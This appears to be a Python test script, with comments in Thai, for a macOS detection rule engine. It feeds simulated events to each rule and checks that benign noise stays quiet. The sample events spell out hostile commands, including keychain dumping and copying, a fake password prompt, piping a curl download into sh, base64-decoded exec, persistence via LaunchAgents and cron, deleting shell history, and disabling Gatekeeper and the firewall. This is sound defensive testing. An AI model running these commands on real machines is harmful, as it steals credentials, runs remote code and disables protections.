"""
ทดสอบระบบด้วย event จำลอง (สร้างขึ้นเอง ไม่ใช่ log จริง และไม่ได้รันการโจมตีจริง)
- ทุกกฎต้องจับ event ตัวอย่างของตัวเองได้ (ไม่มีกฎที่เขียนผิดจนจับอะไรไม่ได้)
- event ปกติ (noise) ต้องไม่ทำให้เกิด alert
รัน:  python tests/test_rules.py
"""
import json
import os
import sys
import tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
sys.path.insert(0, os.path.join(ROOT, "collector"))
from normalize import Normalizer   # noqa: E402
from engine.rules import load_rules   # noqa: E402

T = "2026-11-22T01:00:00.000000000Z"
SHELL = {"audit_token": {"pid": 500, "euid": 501}, "ppid": 1, "executable": {"path": "/bin/zsh"}}


def ev_exec(path, args, pid=600):
    return {"time": T, "process": SHELL, "event": {"exec": {
        "target": {"audit_token": {"pid": pid, "euid": 501}, "executable": {"path": path}},
        "args": args}}}


def ev_create(full):
    d, f = os.path.split(full)
    return {"time": T, "process": SHELL, "event": {"create": {
        "destination_type": 1, "destination": {"new_path": {"dir": {"path": d}, "filename": f}}}}}


def ev_unlink(full):
    return {"time": T, "process": SHELL, "event": {"unlink": {"target": {"path": full}}}}


# rule_id -> event ตัวอย่างที่ "ควร" ถูกจับ
POSITIVE = {
    "MD-0001": ev_exec("/usr/bin/security", ["security", "dump-keychain"]),
    "MD-0002": ev_exec("/usr/bin/security", ["security", "find-generic-password", "-ha", "test"]),
    "MD-0003": ev_exec("/bin/cp", ["cp", "/Users/u/Library/Keychains/login.keychain-db", "/tmp/x"]),
    "MD-0004": ev_exec("/usr/bin/osascript", ["osascript", "-e", 'display dialog "Enter password" default answer ""']),
    "MD-0005": ev_exec("/usr/bin/security", ["security", "export", "-k", "login.keychain", "-t", "certs"]),
    "MD-0006": ev_exec("/usr/bin/osascript", ["osascript", "-e", "return 1"]),
    "MD-0007": ev_exec("/bin/sh", ["sh", "-c", "curl -s http://example.invalid/a.sh | sh"]),
    "MD-0008": ev_exec("/usr/bin/python3", ["python3", "-c", "import base64;exec(base64.b64decode('cHJpbnQoMSk='))"]),
    "MD-0009": ev_exec("/private/tmp/payload", ["/private/tmp/payload"]),
    "MD-0010": ev_exec("/bin/launchctl", ["launchctl", "load", "/Users/u/Library/LaunchAgents/x.plist"]),
    "MD-0011": ev_create("/Users/u/Library/LaunchAgents/com.test.plist"),
    "MD-0012": ev_create("/Library/LaunchDaemons/com.test.plist"),
    "MD-0013": ev_exec("/usr/bin/crontab", ["crontab", "/tmp/cron.txt"]),
    "MD-0014": ev_create("/Users/u/.zshrc"),
    "MD-0015": ev_exec("/usr/bin/osascript", ["osascript", "-e", 'tell application "System Events" to make login item at end']),
    "MD-0016": ev_exec("/usr/bin/chflags", ["chflags", "hidden", "/tmp/x"]),
    "MD-0017": ev_exec("/usr/bin/xattr", ["xattr", "-d", "com.apple.quarantine", "/tmp/app"]),
    "MD-0018": ev_unlink("/Users/u/.zsh_history"),
    "MD-0019": ev_exec("/usr/bin/base64", ["base64", "-d", "/tmp/enc.txt"]),
    "MD-0020": ev_exec("/usr/sbin/spctl", ["spctl", "--master-disable"]),
    "MD-0021": ev_exec("/usr/libexec/ApplicationFirewall/socketfilterfw", ["socketfilterfw", "--setglobalstate", "off"]),
    "MD-0022": ev_exec("/usr/bin/sw_vers", ["sw_vers"]),
    "MD-0023": ev_exec("/usr/bin/dscl", ["dscl", ".", "list", "/Users"]),
    "MD-0024": ev_exec("/usr/sbin/system_profiler", ["system_profiler", "SPApplicationsDataType"]),
    "MD-0025": ev_exec("/usr/sbin/arp", ["arp", "-a"]),
}

# event ปกติที่ "ไม่ควร" ถูกจับ (เช่น noise จาก Cloudflare WARP ที่เจอใน log จริง)
BENIGN = [
    ev_exec("/usr/sbin/ipconfig", ["ipconfig", "getsummary", "en0"]),
    ev_exec("/bin/ls", ["ls", "-la"]),
    ev_exec("/usr/bin/security", ["security", "list-keychains"]),
    ev_exec("/usr/bin/crontab", ["crontab", "-l"]),
    ev_exec("/usr/bin/xattr", ["xattr", "-l", "/tmp/app"]),
    ev_create("/Users/u/Documents/report.docx"),
    ev_unlink("/Users/u/Downloads/old.zip"),
    {"time": T, "process": SHELL, "event": {"fork": {"child": {"audit_token": {"pid": 601}, "executable": {"path": "/bin/zsh"}}}}},
]


def main():
    rules = load_rules(os.path.join(ROOT, "rules"))
    by_id = {r.id: r for r in rules}
    fails = 0

    for rid, raw in POSITIVE.items():
        rec = Normalizer().normalize(raw)
        hit = [r.id for r in rules if r.matches(rec)]
        ok = rid in hit
        fails += not ok
        print(f"{'✅' if ok else '❌'} {rid} จับได้: {hit}")

    missing = set(by_id) - set(POSITIVE)
    if missing:
        print("❌ กฎที่ยังไม่มี event ทดสอบ:", missing)
        fails += len(missing)

    for raw in BENIGN:
        rec = Normalizer().normalize(raw)
        hit = [r.id for r in rules if r.matches(rec)]
        ok = not hit
        fails += not ok
        print(f"{'✅' if ok else '❌'} ปกติ {rec['event_type']:6} {rec['Image']} -> alert {hit}")

    # ParentImage ต้องถูกสร้างจาก cache
    n = Normalizer()
    n.normalize({"time": T, "process": {"audit_token": {"pid": 1}, "ppid": 0, "executable": {"path": "/sbin/launchd"}},
                 "event": {"fork": {"child": {"audit_token": {"pid": 500}, "executable": {"path": "/bin/zsh"}}}}})
    rec = n.normalize(ev_exec("/bin/ls", ["ls"], pid=600) | {"process": {**SHELL, "ppid": 500}})
    ok = rec["ParentImage"] == "/bin/zsh"
    fails += not ok
    print(f"{'✅' if ok else '❌'} ParentImage จาก cache = {rec['ParentImage']}")

    # exit ต้องลบ pid ออกจาก cache และไม่ถูกส่งต่อไปเก็บ
    out_exit = n.normalize({"time": T, "process": {"audit_token": {"pid": 600}, "ppid": 500,
                                                   "executable": {"path": "/bin/ls"}}, "event": {"exit": {"stat": 0}}})
    ok = out_exit is None and 600 not in n.pid_image and 500 in n.pid_image
    fails += not ok
    print(f"{'✅' if ok else '❌'} exit ลบ pid 600 ออกจาก cache (เหลือ {sorted(n.pid_image)})")

    # เขียนไฟล์ jsonl ตัวอย่างไว้ลองรัน collector แบบ --file
    out = os.path.join(ROOT, "tests", "sample_events.jsonl")
    with open(out, "w", encoding="utf-8") as f:
        f.write("eslogger: this non-JSON line must be skipped\n")
        for raw in BENIGN + list(POSITIVE.values()):
            f.write(json.dumps(raw) + "\n")

    print(f"\nกฎทั้งหมด {len(rules)} ข้อ  ผิด {fails}")
    sys.exit(1 if fails else 0)


if __name__ == "__main__":
    main()
